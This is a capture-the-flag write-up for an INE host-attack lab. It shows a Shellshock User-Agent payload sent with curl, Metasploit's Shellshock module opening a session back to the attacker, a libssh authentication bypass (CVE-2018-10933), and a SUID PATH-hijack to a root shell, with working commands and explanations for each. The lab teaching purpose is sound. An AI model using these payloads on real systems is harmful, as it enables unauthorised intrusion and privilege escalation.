# INE System/Host-Based Attacks CTF 2

**Targets:** `target1.ine.local`, `target2.ine.local`
**Tools:** `nmap`, Burp Suite, Metasploit (`apache_mod_cgi_bash_env_exec`, `libssh_auth_bypass`)
---
##step0 : Scan the target1
‘’’
nmap -sC -sV -O target1.ine.loca
‘’’
<img width="940" height="537" alt="image" src="https://github.com/user-attachments/assets/7111d077-f3b3-40ae-b172-92ef4f35d227" />

---
---
##Flag1 : Shellshock via a crafted User-agent 
##What I did 
<img width="940" height="429" alt="image" src="https://github.com/user-attachments/assets/71b745c7-a28f-4005-b691-779b0e201143" />

‘’’
curl  -A “() {  :;  }; echo ; /bin/cat/flag.txt" http://target1.ine.local/browser.cgi
'''
**Why:** 'browser.cgi' almost certainly reads the 'User-Agent' header into an environment variable before handing off to Bash.Shellshosck lets a specifically-crafted environment variable value make Bash execute arbitrary commands the moment it starts up.
**How it Works:** the payload  '() { :; }; echo; /bin/cat /flag.txt' isn't data at all. It's a **function definition**. Vulnerable versions of bash when they import an environment variable that looks like a function definition. continue parsing and executing whatever comes *after* the function body as real shell commands. So instead of just storing "User-Agent" string, the CGI scripts's Bash interpreter actually runs '/bin/cat /flag.txt' and the output gets included in the HTTP response.
**Result:** Confirmed with a directory listing first ('/bin/ls -la /'), then read the flag directly:
'''
curl -A "() { :; }; echo; /bin/cat /flag.txt" http://target1.ine.local/browser.cgi
'''
<img width="940" height="789" alt="image" src="https://github.com/user-attachments/assets/34997019-c316-4cdf-9e9e-2266e8affd7b" />

---

##Flag2 Getting a shell adn exploring '/opt/apache/htdocs'
##What I did
rather than crafting each command by hand with 'curl', I used metasploit dedicated modules for full interactive sessios:
'''
use apache_mod_cgi_bash_env_exec
set lhost eth1
set targeturi /browser.cgi
run
'''
<img width="940" height="758" alt="image" src="https://github.com/user-attachments/assets/9554071c-4d3e-445f-90c4-5f10ec930e13" />

**Why:** The same underlying vulnerability, but a metasploit session makes browsing the filesystem far easier than craftig one-off 'curl' commands for each file.

'''
ls
/opy/apache/htdocs
'''
*Results:** the listing showed a hidden file. '.flag.txt'
'''
cat ./.flag.txt
'''
---

##Flag 3: libssh authentication bypass on target2

'''
nmap -sC -sV target2.ine.local
'''
<img width="940" height="448" alt="image" src="https://github.com/user-attachments/assets/75c1d5e0-3ac2-416f-bb86-4a6f7eaf2acd" />

**Why:** 'libssh 0.8.3' is specifically vulnerable to **CVE-2018-10933**, an authentication bypass in the server-side implementation, and the hint names the technique ('libssh_auth_bypass') directly.

'''
use auxiliary/scanner/ssh/libssh_auth_bypass
set spawn_pty true
setg rhosts target2.ine.local
run
'''
<img width="940" height="438" alt="image" src="https://github.com/user-attachments/assets/4639c1b5-7161-4702-b7c7-5f835f818ed8" />

**How it works:** The SSH protocol's authentication flow expects the client to send an 'SSH_MSG_USERAUTH_REQUEST' message and the server only grants a session once that request is accepted. the buggy libssh version instead also accept an 'SSH2_MSG_USERAUTH_SUCCESS' message sent by *client*.A message that's only supposed to ever come from the server.By sending that message directly, the exploit tricks the server into believing authentication already succeeded, without ever supplying a username or password.
**Results:** A command shell session opened directly as a regular, unpriviledged 'user' account.

'''
ls /home/user
cat /home/user/flag.txt
'''
<img width="835" height="690" alt="image" src="https://github.com/user-attachments/assets/2d594b7a-239d-4e11-834f-0e73f5f14687" />


---

##Flag4: SUID PATH-hijack privilege escalation
###What I did

The user's home directory contained two interesting files: a binary called 'welcome', and a script/binary called 'greetings'.

'''
strings welcome | grep greetings
'''
<img width="614" height="154" alt="image" src="https://github.com/user-attachments/assets/93ac35fb-df17-4ca2-96bb-fa8f17030747" />

**Why:** 'strings' prints the readbale text embedded in a binary. Seeing a reference to 'greetings' inside 'welcome' suggests 'welcome' calls out to 'greetings' as a subprocess-Worth checking whether it does so safely (with an absolute path) or not.
**Results:** 'welcome' was a **SUID-root-binary** confirmed by checking it's permissions with: 'ls -l', visible as the 's' permission bit) that invokes 'greetings' **without an absolute path**, relying on the shell's '$PATH' or the currnet working directory to find it.

###Exploitig the PATH hijack
'''
rm greetings
cp /bin/bash greetings
./welcome
'''
**How it works:** because 'welcome' runs with root priviledges (SUID bit set) but calls 'greetings' by name rather than full path (e.g. `/usr/local/bin/greetings`), I can place my own program called 'greetings' in the same directory, ahead of the real one in the search order. When 'welcome' runs as root and looks for 'greetings', it finds and executes *my* copy instead - which i replaced with a straught copy of Bash. Since 'welcome' itself runs as root, the Bash it launches inherits that same root priviledge.
**Results:** runnning './welcome' dropped straight into a root shell:

'''
./welcome
cd /root
ls
more flag.txt
'''
<img width="683" height="610" alt="image" src="https://github.com/user-attachments/assets/9b98c3a6-bef8-4a92-a47f-688c9062f430" />

## Attack chain

```
target1.ine.local (Apache "Browser Detector")
  |-- Shellshock via User-Agent header -> /flag.txt ................... FLAG 1
  '-- Metasploit Shellshock module -> Meterpreter session
           -> /opt/apache/htdocs/.flag.txt (hidden file) ............... FLAG 2

target2.ine.local (libssh 0.8.3)
  |-- libssh_auth_bypass (CVE-2018-10933) -> shell as "user", no creds
  |        -> /home/user/flag.txt .......................................FLAG 3
  '-- welcome (SUID root) calls "greetings" with no absolute path
           -> replace greetings with /bin/bash -> root shell
           -> /root/flag.txt .............................................FLAG 4
```

| Flag | Technique | Target | Where it was found |
|------|-----------|--------|---------------------|
| 1 | Shellshock (CVE-2014-6271) | target1 | `/flag.txt` via crafted `User-Agent` |
| 2 | Shellshock + hidden-file enumeration | target1 | `.flag.txt` in `/opt/apache/htdocs/` |
| 3 | libssh authentication bypass (CVE-2018-10933) | target2 | `/home/user/flag.txt` |
| 4 | SUID binary PATH hijack | target2 | `/root/flag.txt` |

---
